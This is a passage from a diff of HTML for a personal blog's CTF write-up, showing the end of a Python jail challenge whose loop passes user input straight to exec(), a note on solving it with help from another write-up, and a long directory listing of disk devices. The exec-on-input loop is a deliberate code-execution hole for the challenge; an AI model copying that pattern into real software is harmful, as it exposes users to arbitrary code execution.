+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>        exec(c)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error!&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>The source code looked familiar to me since I had solved a similar challenge in ImaginaryCTF some time ago, but the strange thing is that the payload didn&rsquo;t work because the <code>exit()</code> function of Python gave me an error, looking for it I found this <a href="https://spclr.ch/imaginaryctf-round-11-writeup">https://spclr.ch/imaginaryctf-round-11-writeup</a> and I could solve the challenge.</p>
+<pre>│   │       └── <span style="background-color:#2E3436"><font color="#C4A000"><b>msr</b></font></span>
+│   ├── <span style="background-color:#2E3436"><font color="#C4A000"><b>cpu_dma_latency</b></font></span>
+│   ├── <span style="background-color:#2E3436"><font color="#C4A000"><b>cuse</b></font></span>
+│   ├── <font color="#3465A4"><b>disk</b></font>
+│   │   ├── <font color="#3465A4"><b>by-diskseq</b></font>
+│   │   │   ├── <font color="#06989A"><b>12</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>13</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>14</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>15</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop3</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>16</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop4</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>17</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop5</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>18</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop6</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>19</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop7</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>21</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop8</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>23</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop9</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>25</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop10</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>9</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>9-part1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>9-part2</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   └── <font color="#06989A"><b>9-part3</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-dname</b></font>
+│   │   │   └── <font color="#06989A"><b>ubuntu--vg-ubuntu--lv</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-1</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-id</b></font>
+│   │   │   ├── <font color="#06989A"><b>dm-name-dm_crypt-0</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>dm-name-ubuntu--vg-ubuntu--lv</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>dm-uuid-CRYPT-LUKS2-6e28281414c247dfb351bc7fc57a3d5c-dm_crypt-0</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>dm-uuid-LVM-snLjAkImlJNruqAX0BvDfFjbyZikXxVhjWf2VmLw9s9df7uTN6fkV6lusMsSE8PN</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>lvm-pv-uuid-fF9ph8-vWBV-5OVa-WRl2-EjDT-U8VU-825tGi</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-eui.8ce38e0500f14a1e</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-eui.8ce38e0500f14a1e-part1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-eui.8ce38e0500f14a1e-part2</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-eui.8ce38e0500f14a1e-part3</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU_1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU_1-part1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU_1-part2</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU_1-part3</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU-part1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU-part2</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   └── <font color="#06989A"><b>nvme-KXG8AZNV512G_LA_KIOXIA_83NFC05VF6EU-part3</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-loop-inode</b></font>
+│   │   │   ├── <font color="#06989A"><b>252:1-14024712</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop9</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14024720</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop3</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14024738</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop7</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14024771</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop5</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14024830</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14025019</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14025371</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop6</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14025372</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>252:1-14025375</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop8</b></font></span>
+│   │   │   └── <font color="#06989A"><b>252:1-14025379</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop4</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-loop-ref</b></font>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fbare_5.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fchromium_3199.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fchromium_3203.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop0</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fcore22_2010.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop3</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fcore22_2045.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop5</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fcups_1100.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop4</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fgnome-42-2204_202.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop6</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fgtk-common-themes_1535.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop8</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fsnapd_24718.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop7</b></font></span>
+│   │   │   └── <font color="#06989A"><b>\x2fvar\x2flib\x2fsnapd\x2fsnaps\x2fsnapd_24792.snap</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../loop9</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-partuuid</b></font>
+│   │   │   ├── <font color="#06989A"><b>32c0387e-3908-468a-9ab4-7959faa8eb58</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>def2c0fc-c3e3-4735-af0e-80fdb6aa83bb</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   │   └── <font color="#06989A"><b>fb8e14e9-0349-487e-9022-d3241b845ecc</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   ├── <font color="#3465A4"><b>by-path</b></font>
+│   │   │   ├── <font color="#06989A"><b>pci-0000:04:00.0-nvme-1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>pci-0000:04:00.0-nvme-1-part1</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │   │   ├── <font color="#06989A"><b>pci-0000:04:00.0-nvme-1-part2</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │   │   └── <font color="#06989A"><b>pci-0000:04:00.0-nvme-1-part3</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │   └── <font color="#3465A4"><b>by-uuid</b></font>
+│   │       ├── <font color="#06989A"><b>48adc4e3-b625-4d1c-ad5f-ac48c55df68b</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p2</b></font></span>
+│   │       ├── <font color="#06989A"><b>61C1-4124</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p1</b></font></span>
+│   │       ├── <font color="#06989A"><b>6e282814-14c2-47df-b351-bc7fc57a3d5c</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../nvme0n1p3</b></font></span>
+│   │       └── <font color="#06989A"><b>ff3a073c-4289-4356-97c6-53ed71c90d41</b></font> -&gt; <span style="background-color:#2E3436"><font color="#C4A000"><b>../../dm-1</b></font></span></pre>
+<p>In closing, I want to emphasize that the CTF challenges were excellent and I really enjoyed the experience. I am very satisfied with the level of difficulty and the quality of the challenges. I am certainly looking forward to the next Q4 in March.</p>
+
+    </div>
+</article>
+
+            </main>
+            <footer><div class="footer-container">
+    <div class="h-card bio">
+<p>
+    <a class="u-url" href="http://localhost:1313/">Lukas Blog</a>
+    created by <img class="u-photo" alt="" src="http://localhost:1313/images/i.jpg"> <span class="p-name" rel="me">Lukas Gaete</span>
+        (<span class="u-pronoun">they</span>/<span class="u-pronoun">them</span> pronouns.
+</p>
+
+</div><div class="footer-text footer-right">
+        <p>
+            Stay focus 🧠.
+        </p>
+    </div></div>
+<div class="h-card social">
+    <a class="u-url" rel="me" aria-label="email" href="mailto:abund4nt@proton.me"><span class="social-icon" ></span></a>
+<a class="u-url" rel="me" aria-label="github" href="https://github.com/abund4nt"><span class="social-icon" ></span></a>
+</div>
+</footer>
+        </div>
+    </body>
+</html>
